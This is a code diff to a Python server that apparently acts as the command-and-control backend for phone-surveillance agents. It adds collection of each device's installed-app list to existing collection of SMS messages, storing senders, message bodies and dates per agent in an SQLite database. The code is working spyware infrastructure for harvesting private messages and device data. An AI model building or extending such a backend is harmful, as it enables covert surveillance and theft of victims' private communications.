@@ -72,6 +72,8 @@ def receiveResult(id):
         code = content["code"]
         if code == "sms":
             return handle_sms(content["data"], id)
+        elif code == "app":
+            return handle_app(content["data"], id)
         
     else:
         return ("\n", 204)
@@ -83,13 +85,10 @@ def receiveResult(id):
 def handle_sms(content, id):
     print(f"Received SMS data: {content}\n\n")
     for json_data in content:
-        try:
-            address = json_data["address"]
-            body = json_data["body"]
-            formatted_date = json_data["formatted_date"]
-            messageType = json_data["type"]
-        except:
-            print("[-] Corrupted json data: ", json_data)
+        address = json_data.get("address", "")
+        body = json_data.get("body", "")
+        formatted_date = json_data.get("formatted_date", "")
+        messageType = json_data.get("type", "")
 
         # Save data to database
         sql = "INSERT INTO sms VALUES (?, ?, ?, ?, ?)"
@@ -98,6 +97,21 @@ def handle_sms(content, id):
                
     clearAgentTasks(id)
 
+    return ("Success", 200)
+
+def handle_app(content, id):
+    print(f"Received app data: {content}\n\n")
+    for json_data in content:
+        package = json_data.get("package", "")
+        sourceDir = json_data.get("sourceDir", "")
+        launchActivity = json_data.get("launchActivity", "")
+
+        # Save data to database
+        sql = "INSERT INTO app VALUES (?, ?, ?, ?)"
+        args = (id, package, sourceDir, launchActivity)
+        writeToDatabase(sql, args)
+    
+    clearAgentTasks(id)
     return ("Success", 200)
 
 ####################
@@ -141,11 +155,15 @@ def init_database():
     print("Creating database")
     try:
         conn = sqlite3.connect(db_file)
-        sql = "CREATE TABLE IF NOT EXISTS agents(id TEXT)"
-        conn.execute(sql)
+        sqls = [
+            "CREATE TABLE IF NOT EXISTS agents(id TEXT)",
+            "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)",
+            "CREATE TABLE IF NOT EXISTS app(id TEXT, package TEXT, sourceDir TEXT, launchActivity TEXT)"
+        ]
 
-        sql = "CREATE TABLE IF NOT EXISTS sms(id TEXT, address TEXT, body TEXT, formatted_date TEXT, type INT)"
-        conn.execute(sql)
+        for sql in sqls:
+            conn.execute(sql)
+
         conn.commit()
     except Error as e:
         print(e)
